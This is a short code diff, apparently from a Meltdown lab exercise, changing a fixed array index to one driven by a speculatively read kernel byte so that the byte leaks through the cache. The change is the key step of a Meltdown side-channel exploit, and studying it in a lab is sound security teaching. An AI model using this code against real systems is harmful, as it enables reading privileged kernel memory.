@@ -69,7 +69,7 @@ void meltdown(unsigned long kernel_data_addr)
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;     
-  array[7 * 4096 + DELTA] += 1;          
+  array[kernel_data * 4096 + DELTA] += 1;          
 }
 
 // signal handler
@@ -166,7 +166,7 @@ void meltdown(unsigned long kernel_data_addr)
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;     
-  array[7 * 4096 + DELTA] += 1;          
+  array[kernel_data * 4096 + DELTA] += 1;          
 }
 
 // signal handler
